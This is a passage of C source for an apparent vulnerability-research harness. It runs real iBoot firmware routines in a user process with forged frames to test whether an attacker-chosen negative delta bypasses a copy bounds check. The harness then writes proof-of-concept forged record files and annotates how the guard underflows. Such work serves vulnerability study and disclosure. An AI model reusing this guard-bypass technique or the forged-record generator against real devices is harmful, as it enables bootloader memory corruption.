  { u64 spv; __asm__ volatile("mov %0, sp" : "=r"(spv));
    printf("[cell %s] pre-destquad sp=%llx\n", c->name, (unsigned long long)spv);
    fflush(stdout); }
  struct quad3 dq = fw_dest_quad_build(dst, len, 0);
  printf("[cell %s] REAL dest quad builder -> {%llx,%llx,%llx} (vacuous self-fence"
         " [DST,DST+LEN)); SRC=%llx arena fence [%llx..%llx)\n",
         c->name, (unsigned long long)dq.a,(unsigned long long)dq.b,
         (unsigned long long)dq.c,
         (unsigned long long)(uintptr_t)(G.arena + c->rec_off),
         (unsigned long long)(uintptr_t)G.arena,
         (unsigned long long)(uintptr_t)(G.arena + G.arena_sz));
  fflush(stdout);
  { struct R r;
    GUARDED((r.ret = (long)fw_copy_call(dq.a, dq.b, dq.c, 0,
              (u64)(uintptr_t)(G.arena + c->rec_off),
              (u64)(uintptr_t)G.arena,
              (u64)(uintptr_t)(G.arena + G.arena_sz), 0, len)), r);
    if (r.faulted) {
      printf("[cell %s] FAULT inside REAL copier FUN_167d64: sig=%d pc_off=%llx"
             " (%s) FAULT_ADDR=%llx  in-dest-quad? %d\n",
             c->name, r.f.signo,
             (unsigned long long)(r.f.pc - (u64)(uintptr_t)g_fw),
             classify_pc(r.f.pc - (u64)(uintptr_t)g_fw),
             (unsigned long long)r.f.addr,
             r.f.addr >= dq.a && r.f.addr < dq.c);
      _exit(72);
    }
    printf("[cell %s] REAL FUN_167d64 returned %#lx after copying LEN=%#llx to"
           " DST=%llx\n", c->name, (long)r.ret, (unsigned long long)len,
           (unsigned long long)dst);
  }
  fflush(stdout);
  _exit(0);
}

/* ==================== flagship: mid-function entry ========================
 * Enters the REAL pass-2 body at the first attacker-arithmetic instruction
 * (old @0x199954 'ldr x9,[x25,#0x30]!') with a forged async frame so that a
 * CONTIGUOUS block of real firmware instructions executes, including the
 * probe, guard, dest-quad construction and the copy. Exit is routed through
 * the REAL post-copy exit path ([sp+0x44] flag = 0 -> firmware exit block). */
static long fw_flagship_asm(u64 fsp, u64 ctx, u64 hobj, u64 pb, u64 src,
                            u64 tgt, u64 vlen) {
  register long ret __asm__("x0");
  __asm__ volatile(
    "stp x29, x30, [sp, #-16]!\n\t"
    "mov  x29, sp\n\t"
    "mov  sp, %[fsp]\n\t"                 /* forged frame base              */
    "mov  x0, %[vlen]\n\t"                /* V: window does 'add x8,x0,#3'  */
    "mov  x20, %[ctx]\n\t"
    "mov  x25, %[hobj]\n\t"
    "mov  x8,  %[pb]\n\t"
    "mov  x10, %[src]\n\t"
    "movz x28, #0x110\n\t"
    "mov  x26, xzr\n\t"
    "blr  %[tgt]"
    : "=r"(ret)
    : [fsp] "r"(fsp), [ctx] "r"(ctx), [hobj] "r"(hobj), [pb] "r"(pb),
      [src] "r"(src), [tgt] "r"(tgt), [vlen] "r"(vlen)
    : "memory");
  return ret;
}

static void child_run_flagship(void) {
  struct cellcfg *c = &CELLS[CELL_POS];
  s64 delta = c->delta;
  u64 key = G.wbase + 0x30000;
  u64 pb  = key + delta;
  build_marker(G.arena + c->rec_off, c->rec_len, (u8)CELL_POS, g_run_no);

  /* forged async frame: SP points at frame_mid; the pass-2 body consumes
   * positive sp-offsets (0x44..0xb8). Slots are written at frame_mid+off.
   * Space BELOW frame_mid serves as callee stack room.                    */
  static u8 frame[0x8000];
  memset(frame, 0, sizeof(frame));
  u8 *frame_mid = frame + 0x4000;
  *(u32*)(frame_mid + 0x44) = 0;                    /* post-copy exit sel.  */
  *(u64*)(frame_mid + 0x58) = key;                  /* desc slot            */
  *(u64*)(frame_mid + 0xa0) = (u64)(uintptr_t)G.arena;             /* fence lo */
  *(u64*)(frame_mid + 0xa8) = (u64)(uintptr_t)(G.arena + G.arena_sz); /* hi */
  *(u64*)(frame_mid + 0xb0) = 0;
  *(u64*)(frame_mid + 0x98) = 0;

  static u8 ctx[0x100]; memset(ctx, 0, sizeof(ctx));
  *(u64*)(ctx + 0x68) = (uintptr_t)G.arena + c->rec_off;
  *(u64*)(ctx + 0x70) = (uintptr_t)G.arena + c->rec_off + c->rec_len;

  static u8 homeobj[0x100]; memset(homeobj, 0, sizeof(homeobj));
  *(u64*)(homeobj + 0x18) = G.wbase;
  *(u64*)(homeobj + 0x20) = G.wbase + 0x40000;
  *(u64*)(homeobj + 0x30) = key;

  printf("[flagship] entering REAL FUN_00199150 mid-body @fw+%llx: sp=frame"
         " x25=home-obj x8=PB x10=SRC x20=ctx x0=V(=%x) x28=0x110 [sp+44]=0\n",
         (unsigned long long)O.PASS2_ENTRY, c->rec_len);
  fflush(stdout);

  struct R rf;
  g_force_probe_invalid = 0;
  GUARDED((rf.ret = fw_flagship_asm(
             (u64)(uintptr_t)frame_mid,
             (u64)(uintptr_t)ctx,
             (u64)(uintptr_t)homeobj,
             pb,
             (uintptr_t)G.arena + c->rec_off,
             (u64)((u8*)g_fw + O.PASS2_ENTRY),
             (u64)c->rec_len)), rf);
  if (rf.faulted)
    printf("[flagship] FAULT in/after contiguous real block: sig=%d pc_off=%llx"
           " (%s) addr=%llx x0=%llx x1=%llx\n", rf.f.signo,
           (unsigned long long)(rf.f.pc - (u64)(uintptr_t)g_fw),
           classify_pc(rf.f.pc - (u64)(uintptr_t)g_fw),
           (unsigned long long)rf.f.addr,
           (unsigned long long)rf.f.x0, (unsigned long long)rf.f.x1);
  else
    printf("[flagship] unexpected clean return ret=%ld (firmware reached its"
           " exit path differently than modeled)\n", rf.ret);
  fflush(stdout);
  _exit(73);
}

/* parent-side entry for flagship: fork wrapper is shared below              */

/* ==================== parent orchestration ================================ */
static pid_t spawn_cell(int cell_idx, int mode_flagship) {
  fflush(NULL);
  pid_t pid = fork();
  if (pid == 0) {
    fprintf(stderr, "[child] pid=%d (parent=%d) cell=%s\n", (int)getpid(),
            (int)getppid(), CELLS[cell_idx].name);
    g_cell_index = (u32)cell_idx;
    if (mode_flagship) child_run_flagship();
    else               child_run_cell();
    _exit(75); /* not reached */
  }
  return pid;
}

struct cellverdict {
  int   exited_clean;         /* child _exit(0)                            */
  int   routed_panic;         /* _exit(70)                                 */
  int   unmapped_route;       /* _exit(72)                                 */
  int   flagship_end;         /* _exit(73)                                 */
  struct F f;
  long  status;
};

static struct cellverdict collect_child(pid_t pid, int timeout_ms) {
  struct cellverdict v; memset(&v, 0, sizeof(v));
  int spent = 0, st = 0;
  for (;;) {
    pid_t r = waitpid(pid, &st, WNOHANG);
    if (r == pid) { v.status = st; break; }
    if (r < 0) { perror("waitpid"); break; }
    usleep(50000); spent += 50;
    if (spent >= timeout_ms) { kill(pid, SIGKILL); waitpid(pid, &st, 0);
      v.status = -1; v.f.signo = -SIGKILL; break; }
  }
  if (WIFEXITED(st)) {
    int code = WEXITSTATUS(st);
    v.exited_clean   = (code == 0);
    v.routed_panic   = (code == 70);
    v.unmapped_route = (code == 72);
    v.flagship_end   = (code == 73);
  } else if (WIFSIGNALED(st)) {
    v.f.signo = WTERMSIG(st);
  }
  return v;
}

/* checks marker landing at expected DST (+ boundary integrity)              */
static void verify_landing(int cell_idx, s64 delta, u32 rec_len,
                           const char *expected_desc) {
  u64 dst = G.wbase + delta;
  int cop = check_marker((const u8*)(uintptr_t)dst, rec_len, (u8)cell_idx, g_run_no);
  size_t zeros = count_byte((const u8*)(uintptr_t)dst, rec_len, 0x00);
  printf("[parent] %s: DST=%llx (%s)\n", CELLS[cell_idx].name,
         (unsigned long long)dst, expected_desc);
  printf("[parent]   marker-bytes-present=%d zero-byte-count=%zu/%u\n",
         cop, zeros, rec_len);
  hexline("dst-head",      (const u8*)(uintptr_t)(dst),          16);
  hexline("dst-tail",      (const u8*)(uintptr_t)(dst+rec_len-16), 16);
  /* byte below/above target untouched? */
  if (cell_idx == CELL_NEG || cell_idx == CELL_POS) {
    int below_ok = ((const u8*)dst)[-1] ==
                   ((cell_idx==CELL_NEG) ? 0xC3 : 0xEE);
    int above_ok = ((const u8*)dst)[rec_len] ==
                   ((cell_idx==CELL_NEG) ? 0xC3 : 0xEE);
    printf("[parent]   fence-intact: below=%d above=%d\n", below_ok, above_ok);
  }
}

/* ============================ MODES ======================================= */

static void mode_probe(void) {
  struct { const char *tag; u64 va; int mapped_w; } v[] = {
    { "fw-code mapped",     (u64)((u8*)g_fw + 0x100000), 0 },
    { "home window mapped", G.wbase + 0x20000,            1 },
    { "low apron mapped",   G.wbase - 0x30000,            1 },
    { "hole PROT_NONE",     (u64)(uintptr_t)G.hole,       0 },
  };
  puts("== REAL FUN_0019912c probe sweep (svc-shimmed supervisor) ==");
  { /* REAL memtop + coarse checker receipts (decoded @0x39ad0: coarse(a)=0
     * iff a>>40==0 OR a >= memtop+2^40; probe w0 = (coarse==0))          */
    struct R rm, rc1, rc2;
    GUARDED((rm.ret = (long)fw_memtop_call()), rm);
    GUARDED((rc1.ret = (long)fw_coarse_call(0x1000000000ull)), rc1);
    GUARDED((rc2.ret = (long)fw_coarse_call(0x2000000000ull)), rc2);
    printf("[coarse-diag] REAL memtop=%#llx coarse(2^40)=%#llx coarse(2^41)=%#llx"
           " (coarse!=0 -> probe w0=0 -> FILL route)\n",
           (unsigned long long)rm.ret, (unsigned long long)rc1.ret,
           (unsigned long long)rc2.ret);
    fflush(stdout);
  }
  { u32 *w=(u32*)((u8*)g_fw+O.PROBE_FN);
    printf("[hexcheck] probe fn words: %08x %08x %08x %08x %08x %08x\n",
           w[0],w[1],w[2],w[3],w[4],w[5]); }
  { u32 *w=(u32*)((u8*)g_fw+O.TRANSLATE_HEAD);
    printf("[hexcheck] translate head words: %08x %08x %08x %08x %08x %08x\n",
           w[0],w[1],w[2],w[3],w[4],w[5]); }
  for (unsigned i = 0; i < sizeof(v)/sizeof(v[0]); i++) {
    struct R r;
    g_force_probe_invalid = 0;
    g_shim_armed = 1;
    GUARDED((r.ret = (long)fw_probe_call(v[i].va)), r);
    g_shim_armed = 0;
    if (r.faulted)
      printf("[probe] %-18s va=%llx host_mapped=%d -> FAULTED sig=%d pc_off=%llx addr=%llx\n",
             v[i].tag, (unsigned long long)v[i].va, v[i].mapped_w,
             r.f.signo, (unsigned long long)(r.f.pc - (u64)(uintptr_t)g_fw),
             (unsigned long long)r.f.addr);
    else
      printf("[probe] %-18s va=%llx host_mapped=%d -> w0=%#llx shim_calls=%llu\n",
             v[i].tag, (unsigned long long)v[i].va, v[i].mapped_w,
             (u64)r.ret, (unsigned long long)g_shim_calls);
    printf("[probe]   internal: last_dst=%#llx last_answer=%#llx\n",
           (unsigned long long)g_last_dst, (unsigned long long)g_last_answer);
    fflush(stdout);
  }
  puts("== probe sweep done ==");
}

static void mode_layers(void) {
  u64 dst = G.wbase + 0x20000;
  u64 r;
  puts("== LAYERED real-code probes ==");
  /* layer 1: FUN_001bb394 sanity */
  __asm__ volatile("blr %[fn]" : "=r"(r)
    : [fn]"r"((u64)((u8*)g_fw+0x1BB394)), "r"(dst) : "lr","memory","cc");
  printf("[layer1] FUN_1bb394 -> %#llx\n", (unsigned long long)r);
  /* layer 1b: tpidrro mirror */
  u64 tpid;
  __asm__ volatile("mrs %0, tpidrro_el0" : "=r"(tpid));
  printf("[layer1b] host tpidrro=%#llx\n", (unsigned long long)tpid);
  /* layer 2: FUN_001bb4c8(-1-check) */
  __asm__ volatile("blr %[fn]" : "=r"(r)
    : [fn]"r"((u64)((u8*)g_fw+0x1BB4C8)), "r"(tpid) : "lr","memory","cc");
  printf("[layer2] FUN_1bb4c8(tpidrro) -> %#llx\n", (unsigned long long)r);
  /* layer 3: full FUN_00036f1c head (arg=dst), shim armed */
  struct R rr;
  g_shim_armed = 1; g_force_probe_invalid = 0;
  GUARDED((rr.ret = ({u64 q; __asm__ volatile("blr %[fn]" : "=r"(q)
      : [fn]"r"((u64)((u8*)g_fw+O.TRANSLATE_HEAD)), "r"(dst) : "lr","memory","cc"); q;})), rr);
  g_shim_armed = 0;
  if (rr.faulted)
    printf("[layer3] TRANSLATE(dst): FAULT sig=%d pc_off=%llx addr=%llx\n",
           rr.f.signo, (unsigned long long)(rr.f.pc-(u64)(uintptr_t)g_fw),
           (unsigned long long)rr.f.addr);
  else
    printf("[layer3] TRANSLATE(dst): x0=%#llx\n", (unsigned long long)rr.ret);
  /* layer 4: coarse checker alone */
  u64 sample = 0x200000000ull | 0x104d1000ull;
  __asm__ volatile("blr %[fn]" : "=r"(r)
    : [fn]"r"((u64)((u8*)g_fw+O.COARSE_CHK)), "r"(sample) : "lr","memory","cc");
  printf("[layer4] COARSECHK(%#llx) -> %#llx\n",
         (unsigned long long)sample,(unsigned long long)r);
  __asm__ volatile("blr %[fn]" : "=r"(r)
    : [fn]"r"((u64)((u8*)g_fw+O.COARSE_CHK)), "r"(dst) : "lr","memory","cc");
  printf("[layer4] COARSECHK(%#llx) -> %#llx\n",
         (unsigned long long)dst,(unsigned long long)r);
  fflush(stdout);
}

static void mode_calib(void) {
  puts("== CALIBRATION: supervisor answer encoding recovery ==");
  for (int enc = 0; enc <= 1; enc++) {
    g_enc_mode = enc;
    memset(G.win, 0xEE, 0x40000);
    build_marker(G.arena + CELLS[CELL_POS].rec_off, CELLS[CELL_POS].rec_len,
                 (u8)CELL_POS, g_run_no);
    pid_t pid = spawn_cell(CELL_POS, 0);
    struct cellverdict cv = collect_child(pid, 8000);
    int cop = check_marker((const u8*)(G.wbase + CELLS[CELL_POS].delta),
                           CELLS[CELL_POS].rec_len, (u8)CELL_POS, g_run_no);
    size_t zeros = count_byte((const u8*)(G.wbase + CELLS[CELL_POS].delta),
                              CELLS[CELL_POS].rec_len, 0x00);
    printf("[calib] enc=%d(%s) child_exited=%d markers=%d zeros=%zu/%u -> "
           "copy-route=%s\n", enc, enc ? "handle>=2^41" : "raw-pa",
           cv.exited_clean, cop, zeros, CELLS[CELL_POS].rec_len,
           cop ? "YES" : "no");
    fflush(NULL);
  }
}

static void mode_matrix(void) {
  printf("== MATRIX fw=%s (%s) enc_mode=%d run=%u ==\n", g_fw_path,
         g_newfw ? FW_NAME_NEW : FW_NAME_OLD, g_enc_mode, g_run_no);
  printf("[fw] mapped %p sz=%zu svc@fw+%llx probe@fw+%llx pass2entry@fw+%llx"
         " panicsite@fw+%llx wbase=%llx\n", (void*)g_fw, g_fw_sz,
         (unsigned long long)O.SVC_SITE, (unsigned long long)O.PROBE_FN,
         (unsigned long long)O.PASS2_ENTRY, (unsigned long long)O.PANIC86_BLOCK,
         (unsigned long long)G.wbase);
  span_add((uintptr_t)g_fw, (uintptr_t)g_fw + g_fw_sz + (16<<20), 1);
  span_add((uintptr_t)G.apron,  (uintptr_t)G.apron  + 0x30000, 1);
  span_add((uintptr_t)G.win,    (uintptr_t)G.win    + 0x40000, 1);
  span_add((uintptr_t)G.hi_apron,(uintptr_t)G.hi_apron + 0x08000, 1);
  span_add((uintptr_t)G.arena,  (uintptr_t)G.arena  + G.arena_sz, 1);
  span_add((uintptr_t)G.arena, (uintptr_t)G.arena + G.arena_sz, 1);

  for (int ci = 0; ci < NCELLS; ci++) {
    if (g_ncell_args > 0) {                 /* single-cell filter          */
      int match = 0;
      for (int a = 0; a < g_ncell_args; a++) {
        const char *arg = g_cell_args[a];
        size_t alen = strlen(arg);
        if (!strncmp(CELLS[ci].name, arg, alen)) match = 1;   /* prefix: "P1" -> "P1-positive-delta" */
      }
      if (!match) continue;
    }
    printf("[geo] apron=%p win=%p hi=%p hole=%p wbase=%llx\n",(void*)G.apron,(void*)G.win,(void*)G.hi_apron,(void*)G.hole,(unsigned long long)G.wbase);
  int wr = mprotect(G.apron, 0x1000, PROT_READ|PROT_WRITE);
  *(volatile u8*)(G.apron) = 0xC3;
  printf("[geo] test-write@apron=%d w=%d\n", *G.apron, wr);
  fflush(stdout);
  memset(G.apron, 0xC3, 0x30000);
  printf("[geo] apron done\n");
    memset(G.win,   0xEE, 0x40000);
  printf("[geo] win done\n");
    memset(G.hi_apron, 0xB7, 0x8000);
    printf("\n--- CELL %d %s (run=%u) ---\n", ci, CELLS[ci].name, g_run_no);
    fflush(NULL);
    pid_t pid = spawn_cell(ci, 0);
    struct cellverdict cv = collect_child(pid, 15000);

    switch (ci) {
    case CELL_POS: {
      if (!cv.exited_clean && !cv.routed_panic)
        printf("[parent]   unexpected termination status=%ld\n", (long)cv.status);
      verify_landing(CELL_POS, CELLS[CELL_POS].delta, CELLS[CELL_POS].rec_len,
                     "in-window (+0x1230)");
      break; }
    case CELL_NEG: {
      verify_landing(CELL_NEG, CELLS[CELL_NEG].delta, CELLS[CELL_NEG].rec_len,
                     "BELOW window (-0x20000, low apron)");
      int cop = check_marker((const u8*)(G.wbase + CELLS[CELL_NEG].delta),
                             CELLS[CELL_NEG].rec_len, (u8)CELL_NEG, g_run_no);
      printf("[parent] VERDICT N1: %s\n",
             cop ? "NEGATIVE-DELTA WRITE LANDED (decoded-content bytes below"
                   " home window)" : "no marker (see child trace)");
      break; }
    case CELL_NEGFAULT: {
      printf("[parent] VERDICT N2: fault-routed=%d (child sig evidence above;"
             " no hidden clamp exercised)\n", cv.unmapped_route);
      break; }
    case CELL_PANIC: {
      printf("[parent] VERDICT T2: routed-real-panic-block=%d\n",
             cv.routed_panic);
      break; }
    case CELL_MISALIGN: {
      verify_landing(CELL_MISALIGN, CELLS[CELL_MISALIGN].delta,
                     CELLS[CELL_MISALIGN].rec_len, "in-window misaligned dst");
      int intact = count_byte((const u8*)(G.wbase + 0x1232),
                              CELLS[CELL_MISALIGN].rec_len, 0xEE) ==
                             CELLS[CELL_MISALIGN].rec_len;
      printf("[parent] VERDICT T1: dst-still-prefilled=%d (real copier aborted"
             " pre-write: alignment check live)\n", intact);
      break; }
    case CELL_PROBEINV: {
      size_t survivors = count_byte((const u8*)(G.wbase + 0x22000),
                                    CELLS[CELL_PROBEINV].rec_len, 0xEE);
      printf("[parent] VERDICT Z1: (trace decides route) dst-area-untouched"
             "-bytes=%zu/%u\n", survivors, CELLS[CELL_PROBEINV].rec_len);
      break; }
    }
    fflush(NULL);
  }
  printf("\n== MATRIX done ==\n");
}

/* ============================ PoC writer ================================== */
struct pocrec {                       /* the forged record stream            */
  u64 key;                            /* +0x00 prior-record base anchor      */
  s64 delta;                          /* attacker DELTA = PB - KEY           */
  u64 pb;                             /* PB (loaded from desc slot)          */
  u64 wbase, wend;                    /* home window object +0x18/+0x20 pair */
  u64 ctx68_a, ctx68_b;               /* extent object pair -> V             */
  u64 arena, arena_hi;                /* src fence                           */
  u32 rec_off, rec_len;               /* record placement / length           */
  u32 dst_kind;                       /* target class                        */
  u64 dst;                            /* computed destination                */
  u32 magic;
};
#define POC_MAGIC 0x474D4834u /* '4HMG' */

static void emit_poc(int cell_idx) {
  struct cellcfg *c = &CELLS[cell_idx];
  u64 key = G.wbase + 0x30000, pb = key + c->delta;
  struct pocrec r; memset(&r, 0, sizeof(r));
  r.magic = POC_MAGIC;
  r.key = key; r.pb = pb; r.delta = c->delta;
  r.wbase = G.wbase; r.wend = G.wbase + 0x40000;
  r.ctx68_a = (uintptr_t)G.arena + c->rec_off;
  r.ctx68_b = r.ctx68_a + c->rec_len;
  r.arena = (uintptr_t)G.arena; r.arena_hi = r.arena + G.arena_sz;
  r.rec_off = c->rec_off; r.rec_len = c->rec_len;
  r.dst_kind = c->dst_kind;
  compute_dst(c, c->delta, &r.dst);

  char fn[256];
  snprintf(fn, sizeof(fn), "/private/tmp/ds_iboot/Report5_HOMING/poc_%s.bin",
           c->name);
  for (char *p = fn; *p; p++) if (*p == ' ') *p = '_';
  FILE *f = fopen(fn, "wb");
  if (!f) { perror("poc open"); return; }
  fwrite(&r, sizeof(r), 1, f);
  /* append the decoded-content bytes the firmware would copy            */
  fwrite(G.arena + c->rec_off, 1, c->rec_len, f);
  fclose(f);
  printf("[emit] %s (%zu B record-struct + %u B content)\n", fn,
         sizeof(struct pocrec), c->rec_len);
}

static void mode_emitpoc(void) {
  printf("== EMIT POC ARTIFACTS (fw=%s) ==\n",
         g_newfw ? FW_NAME_NEW : FW_NAME_OLD);
  char path[512];
  snprintf(path, sizeof(path),
           "/private/tmp/ds_iboot/Report5_HOMING/poc_fields.txt");
  FILE *t = fopen(path, "w");
  if (t) {
    fprintf(t,
      "Report5_HOMING poc field annotations\n"
      "====================================\n"
      "File format: 96-byte struct pocrec followed by rec_len content bytes.\n"
      "Provenance of each field against iBoot FUN_00199150 pass-2 consumers:\n"
      "\n"
      "  key       prior-record base anchor: read by 'ldr x9,[x25,#0x30]!'\n"
      "            from HOME_OBJ+0x30 (old @0x199954 / new @0x199B28).\n"
      "  pb        this record's base word as stored by pass-1 into the\n"
      "            descriptor slot consumed at *(desc+0x50); feeds\n"
      "            'sub x9,x8,x9' DELTA computation (@0x199958/@0x199B2C).\n"
      "  delta     attacker-chosen signed difference PB - KEY.\n"
      "  wbase/wend home-window extent gauge members at OBJ+0x18/OBJ+0x20;\n"
      "            E = FUN_0019A770(obj+0x18,obj+0x18,obj+0x30)=wend-wbase.\n"
      "  ctx68_*   pass-1 range object at async-ctx+0x68; V = member[1]-member[0]\n"
      "            via REAL FUN_0019A40C/FUN_0019A770; LEN=align4(V+3)&~3.\n"
      "  rec_off   offset of this record's data in the decoded arena;\n"
      "            SRC = span.base + rec.off8 (old @0x199944 'add x10,x27,x23').\n"
      "  dst       DST = WBASE + DELTA (old @0x199964 'add x27,x8,x9').\n"
      "\n"
      "For negative-delta cells delta<0 wraps guard RHS E-delta underflowing\n"
      "to ~2^64 so the ONLY guard cmp LEN,x8 ; b.hi panic(0x86) passes.\n");
    fclose(t);
    printf("[emit] %s\n", path);
  }
  for (int ci = 0; ci < NCELLS; ci++) {
    build_marker(G.arena + CELLS[ci].rec_off, CELLS[ci].rec_len, (u8)ci, g_run_no);
    emit_poc(ci);
  }
}

/* =============================== main ===================================== */
int main(int argc, char **argv) {
  const char *mode = argc > 1 ? argv[1] : "matrix";
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  const char *runs = getenv("DS_RUN");       g_run_no = runs ? (u8)atoi(runs) : 1;
  const char *enc  = getenv("DS_ENC_MODE");  g_enc_mode = enc ? atoi(enc) : -1;

  fw_map();
  geo_build();
  install_handlers();

  if (!strcmp(mode, "layers"))    {
    if (g_enc_mode < 0) g_enc_mode = 1;
    span_add((uintptr_t)g_fw, (uintptr_t)g_fw + g_fw_sz + (16<<20), 1);
    span_add((uintptr_t)G.apron,  (uintptr_t)G.apron  + 0x30000, 1);
    span_add((uintptr_t)G.win,    (uintptr_t)G.win    + 0x40000, 1);
    span_add((uintptr_t)G.hi_apron,(uintptr_t)G.hi_apron + 0x08000, 1);
    span_add((uintptr_t)G.arena,  (uintptr_t)G.arena  + G.arena_sz, 1);
    mode_layers(); return 0;
  }
  if (!strcmp(mode, "calib"))     { mode_calib(); return 0; }
  if (!strcmp(mode, "probe"))     {
    if (g_enc_mode < 0) g_enc_mode = 1;
    span_add((uintptr_t)g_fw, (uintptr_t)g_fw + g_fw_sz + (16<<20), 1);
    span_add((uintptr_t)G.apron,  (uintptr_t)G.apron  + 0x30000, 1);
  span_add((uintptr_t)G.win,    (uintptr_t)G.win    + 0x40000, 1);
  span_add((uintptr_t)G.hi_apron,(uintptr_t)G.hi_apron + 0x08000, 1);
  span_add((uintptr_t)G.arena,  (uintptr_t)G.arena  + G.arena_sz, 1);
    span_add((uintptr_t)G.arena, (uintptr_t)G.arena + G.arena_sz, 1);
    mode_probe(); return 0;
  }
  if (!strcmp(mode, "matrix"))    {
    if (g_enc_mode < 0) g_enc_mode = 0;
    mode_matrix(); return 0;
  }
  if (!strcmp(mode, "flagship"))  {
    if (g_enc_mode < 0) g_enc_mode = 0;
    span_add((uintptr_t)g_fw, (uintptr_t)g_fw + g_fw_sz + (16<<20), 1);
    span_add((uintptr_t)G.apron,  (uintptr_t)G.apron  + 0x30000, 1);
  span_add((uintptr_t)G.win,    (uintptr_t)G.win    + 0x40000, 1);
  span_add((uintptr_t)G.hi_apron,(uintptr_t)G.hi_apron + 0x08000, 1);
  span_add((uintptr_t)G.arena,  (uintptr_t)G.arena  + G.arena_sz, 1);
    span_add((uintptr_t)G.arena, (uintptr_t)G.arena + G.arena_sz, 1);
    pid_t pid = spawn_cell(CELL_POS, 1);
    struct cellverdict cv = collect_child(pid, 15000);
    int cop = check_marker((const u8*)(G.wbase + CELLS[CELL_POS].delta),
                           CELLS[CELL_POS].rec_len, (u8)CELL_POS, g_run_no);
    size_t zeros = count_byte((const u8*)(G.wbase + CELLS[CELL_POS].delta),
                              CELLS[CELL_POS].rec_len, 0x00);
    printf("[parent] FLAGSHIP verdict: ended=%d markers=%d zeros=%zu/%u status=%ld\n",
           cv.flagship_end, cop, zeros, CELLS[CELL_POS].rec_len, (long)cv.status);
    verify_landing(CELL_POS, CELLS[CELL_POS].delta, CELLS[CELL_POS].rec_len,
                   "flagship mid-function entry");
    return 0;
  }
  if (!strcmp(mode, "cell")) {
    /* single-cell mode: `homing cell <name> [name2 ...]` for isolated runs */
    if (g_enc_mode < 0) g_enc_mode = 0;
    g_cell_args = (const char**)&argv[2];
    g_ncell_args = argc - 2;
    mode_matrix();                    /* full geo + spans + cell loop     */
    return 0;
  }
  if (!strcmp(mode, "emitpoc"))   { mode_emitpoc(); return 0; }

  fprintf(stderr, "usage: homing <calib|probe|matrix|flagship|emitpoc|layers>\n"
                  "       env: DS_FW=<firmware bin> DS_RUN=<n> DS_ENC_MODE=<0|1>\n");
  return 2;
}
